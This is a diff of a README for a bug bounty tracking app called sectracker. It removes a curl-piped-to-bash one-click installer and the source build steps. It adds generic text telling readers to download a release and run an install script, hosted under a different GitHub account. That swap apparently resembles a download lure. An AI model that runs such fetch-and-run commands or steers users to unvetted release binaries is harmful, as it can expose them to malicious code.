@@ -1,183 +1,80 @@
-# SecTracker 🛡️
+# 🐞 sectracker: A Modern Bug Bounty and Security Research Management Platform
 
-<div align="center">
+![sectracker](https://img.shields.io/badge/sectracker-v1.0.0-blue.svg)  
+[![GitHub Release](https://img.shields.io/badge/Release-Download%20Latest%20Release-brightgreen)](https://github.com/jagh-oubbi/sectracker/releases)
 
-A Modern Bug Bounty and Security Research Management Platform
+Welcome to **sectracker**, your go-to platform for managing bug bounties and enhancing security research. This tool streamlines the process of tracking vulnerabilities, managing reports, and collaborating with teams to improve security posture.
 
-[![React](https://img.shields.io/badge/React-20232A?style=for-the-badge&logo=react&logoColor=61DAFB)](https://reactjs.org/)
-[![TypeScript](https://img.shields.io/badge/TypeScript-007ACC?style=for-the-badge&logo=typescript&logoColor=white)](https://www.typescriptlang.org/)
-[![Vite](https://img.shields.io/badge/Vite-B73BFE?style=for-the-badge&logo=vite&logoColor=FFD62E)](https://vitejs.dev/)
-[![Supabase](https://img.shields.io/badge/Supabase-181818?style=for-the-badge&logo=supabase&logoColor=white)](https://supabase.io/)
+## Table of Contents
 
-</div>
+1. [Features](#features)
+2. [Installation](#installation)
+3. [Usage](#usage)
+4. [Contributing](#contributing)
+5. [License](#license)
+6. [Contact](#contact)
 
-## 🎯 Overview
+## Features
 
-SecTracker is your all-in-one platform for managing bug bounty hunting and security research activities. Track your findings, manage reports, and organize your security research workflow efficiently.
+- **User-Friendly Interface**: Navigate easily through a clean and intuitive design.
+- **Real-Time Tracking**: Monitor bug submissions and their statuses in real time.
+- **Collaboration Tools**: Work with your team seamlessly to manage and resolve vulnerabilities.
+- **Customizable Workflows**: Tailor the platform to fit your unique processes.
+- **Reporting**: Generate detailed reports for analysis and compliance.
+- **Integration**: Connect with other tools and platforms for a more robust workflow.
 
-## ✨ Features
+## Installation
 
-- 🎯 **Platform & Program Management**
-  - Organize bug bounty platforms and programs
-  - Track scope and bounty ranges
-  - Manage platform-specific profiles
+To get started with sectracker, follow these steps:
 
-- 🐛 **Bug Report Management**
-  - Detailed bug reporting with markdown support
-  - Status tracking from draft to bounty awarded
-  - Severity and impact assessment
+1. Download the latest release from the [Releases section](https://github.com/jagh-oubbi/sectracker/releases).
+2. Extract the downloaded file.
+3. Run the installation script. For example:
 
-- 📊 **Dashboard**
-  - Visual overview of your hunting activities
-  - Drag-and-drop customization
-  - Progress tracking and statistics
+   ```bash
+   ./install.sh
+   ```
 
-- 📚 **Research Tools**
-  - Integrated RSS feed reader
-  - Reading list management
-  - Personal notes and tips organization
-  - Customizable security checklists
+4. Follow the on-screen instructions to complete the setup.
 
-## 🛠️ Tech Stack
+## Usage
 
-- **Frontend**
-  - React + TypeScript
-  - Vite for blazing fast builds
-  - Shadcn UI components
-  - TanStack Query for state management
+Once you have installed sectracker, you can begin using it to manage your bug bounty programs. Here’s how to get started:
 
-- **Backend & Database**
-  - Supabase for backend services
-  - PostgreSQL database
-  - Real-time subscriptions
+1. **Create an Account**: Sign up for a new account or log in if you already have one.
+2. **Set Up a Project**: Create a new project for your bug bounty program.
+3. **Invite Team Members**: Add team members to collaborate on your project.
+4. **Start Tracking Bugs**: Use the platform to submit, track, and resolve vulnerabilities.
 
-## 🚀 Getting Started
+### Example Workflow
 
-### Prerequisites
+1. A security researcher discovers a vulnerability.
+2. They submit a report through the sectracker platform.
+3. The team reviews the submission and assigns it to a developer.
+4. The developer fixes the issue and marks it as resolved.
+5. The team generates a report to analyze the findings.
 
-- Node.js (v18 or higher)
-- npm or bun package manager
-- PostgreSQL (if using local database)
+## Contributing
 
-### Installation
+We welcome contributions to sectracker. If you would like to help improve the platform, please follow these steps:
 
-### 🎉 One-Click Installation (Recommended)
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes and commit them with clear messages.
+4. Push your branch to your forked repository.
+5. Submit a pull request to the main repository.
 
-The fastest way to get SecTracker up and running is with our automated installation script:
+Please ensure your code follows our [coding standards](#) and includes appropriate tests.
 
-```bash
-curl -fsSL https://raw.githubusercontent.com/SecFathy/sectracker/refs/heads/main/1-click.sh | bash
-```
+## License
 
+sectracker is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
-1. Clone the repository:
-```bash
-git clone https://github.com/secfathy/sectracker.git
-cd sectracker
-```
+## Contact
 
-2. Install dependencies:
-```bash
-npm install
-# or
-bun install
-```
+For questions or support, please reach out to us:
 
-3. Configure environment variables:
-```bash
-cp .env.example .env
-```
+- **Email**: support@sectracker.com
+- **GitHub Issues**: Use the GitHub Issues section for bug reports and feature requests.
 
-Edit `.env` with your configuration:
-```plaintext
-# Supabase Configuration (Option 1)
-VITE_SUPABASE_URL=your_supabase_url
-VITE_SUPABASE_ANON_KEY=your_supabase_anon_key
-
-# Direct PostgreSQL Configuration (Option 2)
-DATABASE_URL=postgresql://user:password@localhost:5432/sectracker
-```
-
-4. Initialize the database:
-```bash
-# If using PostgreSQL directly
-psql -U postgres -d sectracker -f database/init.sql
-```
-
-5. Start the development server:
-```bash
-npm run dev
-# or
-bun dev
-```
-
-### 🐳 Docker Setup
-
-Alternatively, use Docker Compose:
-
-```bash
-docker-compose up --build
-```
-
-## 🔧 Configuration Options
-
-### Supabase Setup
-
-1. Create a new Supabase project
-2. Copy your project URL and anon key
-3. Update `.env` with Supabase credentials
-
-### Local PostgreSQL Setup
-
-1. Create a new PostgreSQL database
-2. Run the initialization script:
-```bash
-psql -U postgres -d sectracker -f database/init.sql
-```
-3. Update `.env` with database connection string
-
-## 📖 Development
-
-### Project Structure
-```
-src/
-├── components/     # React components
-├── hooks/          # Custom React hooks
-├── integrations/   # External service integrations
-├── lib/            # Utility functions and configs
-└── pages/          # Page components
-```
-
-### Available Scripts
-
-- `npm run dev` - Start development server
-- `npm run build` - Build for production
-- `npm run preview` - Preview production build
-
-## 🤝 Contributing
-
-We welcome contributions! Please follow these steps:
-
-1. Fork the repository
-2. Create a feature branch
-3. Commit your changes
-4. Push to your branch
-5. Open a Pull Request
-
-## 📄 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-## 🙏 Acknowledgments
-
-- [Shadcn UI](https://ui.shadcn.com/) for the beautiful components
-- [Supabase](https://supabase.io/) for the backend infrastructure
-- [Radix UI](https://www.radix-ui.com/) for accessible component primitives
-
----
-
-<div align="center">
-Built with 💙 for the Security Research Community
-</div>
-
-        
+Thank you for choosing sectracker! We hope this platform helps you enhance your security research efforts. For more updates, check out the [Releases section](https://github.com/jagh-oubbi/sectracker/releases).
